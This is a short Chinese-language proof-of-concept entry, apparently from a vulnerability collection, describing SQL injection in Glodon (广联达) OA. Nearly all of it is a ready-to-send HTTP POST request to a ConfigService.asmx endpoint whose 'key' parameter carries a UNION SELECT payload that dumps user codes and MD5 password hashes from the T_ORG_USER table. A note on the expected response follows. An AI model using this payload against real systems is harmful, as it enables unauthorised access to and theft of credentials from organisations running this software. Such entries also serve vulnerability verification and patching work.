﻿# 广联达OA sql注入漏洞

> 更新时间：2023-12-04

> 漏洞编号：

> 漏洞说明：Referer: http://xxx.com:8888/Services/Identification/Server/Incompatible.aspx

> 漏洞特征：

> 验证脚本：HTTP

```
POST /Webservice/IM/Config/ConfigService.asmx/GetIMDictionary HTTP/1.1
Accept: text/html,application/xhtml xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/x-www-form-urlencoded

dasdas=&key=1' UNION ALL SELECT top 1812 concat(F_CODE,':',F_PWD_MD5) from T_ORG_USER --
```

> 响应代码特征：-1

> 响应内容特征：

> 上传文件定位：

> 验证文件来源：广联达OA sql注入漏洞.poc
